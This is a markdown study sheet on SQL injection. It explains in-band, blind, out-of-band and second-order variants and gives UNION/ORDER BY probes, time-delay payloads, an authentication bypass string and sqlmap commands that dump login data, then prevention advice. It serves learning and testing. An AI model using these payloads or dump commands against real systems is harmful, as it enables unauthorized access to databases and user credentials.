# SQL Injection

SQL injection attack consists of insertion of either a partial or complete SQL query via the data input from the client (Browser) to application Server.

## Impact

A successful SQL injection attack can result in:
- Authentication Bypass 
- Unauthorized access of sensitive data, like: Personal user information, Passwords, Credit card details, etc.
- Attacker can obtain a persistent backdoor into an organization's systems.

## SQL Injection Technique

### 1. In-band SQLi (Classic SQLi)
   - ***Error-based SQLi:*** this technique forces the database to generate an error, giving the attacker or tester information upon which to refine their injection.
   - ***Union-based SQLi:*** can be used when the SQL injection flaw happens in a SELECT statement, making it possible to combine two queries into a single result or result set.
 
### 2. Inferential SQLi (Blind SQLi)
   - ***Boolean-based:*** use Boolean condition(s) to verify whether certain conditions are true or false.
   - ***Time-based:*** use database commands (e.g. sleep) to delay answers in conditional queries. It useful when attacker doesn’t have some kind of answer (result, output, or error) from the application

### 2. Out-of-band SQLi
   This technique used to retrieve data using a different channel (e.g., make a HTTP connection to send the results to a web server).

### Second-order SQL injection (also known as stored SQL injection):
First-order SQL injection arises where the application takes user input from an HTTP request and,in the course of processing that request, incorporates the input into an SQL query in an unsafe way.

In second-order SQL injection, the application takes user input from an HTTP request and stores it for future use. This is usually done by placing the input into a database, but no vulnerability arises at the point where the data is stored. Later, when handling a different HTTP request, the application retrieves the stored data and incorporates it into an SQL query in an unsafe way.

## Standard SQL Injection Testing

### Determining the number of columns required in an SQL injection UNION attack
1.  ORDER BY clauses and incrementing the specified column index until an error occurs.
 ```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc. 
```
When the specified column index exceeds the number of actual columns in the result set, the database returns an error, such as:`The ORDER BY position number 3 is out of range of the number of items in the select list`

2. UNION keyword can be used to retrieve data from other tables within the database
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```
 If the number of nulls does not match the number of columns, the database returns an error, such as:`All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists` 

### Finding columns with a useful data type in an SQL injection UNION attack

```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'-- 
```
If the data type of a column is not compatible with string data, the injected query will cause a database error, such as:`Conversion failed when converting the varchar value 'a' to data type int`
 
### Find database type and version 
```' UNION SELECT @@version--```

### Bliend - Time delays
```
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```
The first of these inputs will not trigger a delay, because the condition 1=2 is false. The second input will trigger a delay of 10 seconds, because the condition 1=1 is true. 

### Example 1 (classical SQL Injection):
Consider the following SQL query:
```
SELECT * FROM Users WHERE Username='$username' AND Password='$password'
$username = 1' or '1' = '1
$password = 1' or '1' = '1
The query will be:
SELECT * FROM Users WHERE Username='1' OR '1' = '1' AND Password='1' OR '1' = '1' 
```

### Example 2 (simple SELECT statement):
Consider the following SQL query: 
```
SELECT * FROM products WHERE id_product=$id_product
http://www.example.com/product.php?id=10
```

### Example 3 (Stacked queries):
Consider the following SQL query: 
```
SELECT * FROM products WHERE id_product=$id_product
http://www.example.com/product.php?id=10; INSERT INTO users (…)
```
- More Information: https://www.owasp.org/index.php/SQL_Injection
![image](https://user-images.githubusercontent.com/65315090/129912785-f84232fc-a41a-4520-92fa-6c7dfe803e70.png)
![image](https://user-images.githubusercontent.com/65315090/129912819-124fbe54-d140-4133-8a99-0a3092ba3b15.png)

## Tools for SQL Injection

### [SQLMap](https://sqlmap.org/)

**Step-1:** Find Current Database name
  `sqlmap –u http://www.nayan.com/item_id=3 --level=5 --risk=3 --current-db --batch`

**Step-2:** List DBMS database
  `sqlmap –u http://www.nayan.com/item_id=3 --dbs`

**Step-3:** List Tables
  `sqlmap –u http://www.nayan.com/item_id=3 –D tablename --tables`
  
**Step-4:** List columns on tables
	`sqlmap –u http://www.nayan.com/item_id=3 –D tablename –T user_info --columns`
  
**Step-5:** List column data from columns
  `sqlmap –u http://www.nayan.com/item_id=3 –D tablename –T user_info –C login --dump`

## Prevent SQL injection

1. Prevented by using ***Parameterized queries***, instead of string concatenation within the query. (also known as ***Prepared statements***)
2. Use of Stored Procedures
3. Escaping All User Supplied Input
4. Allow-list Input Validation
5. Filter out special charactercharacter like:`' " - # / \ ; NULL , () @` in all strings from:
   - Input from users
   - Parameters from URL
   - Values from cookie

Mitigation: https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet

## Refrence
- https://portswigger.net/web-security/sql-injection
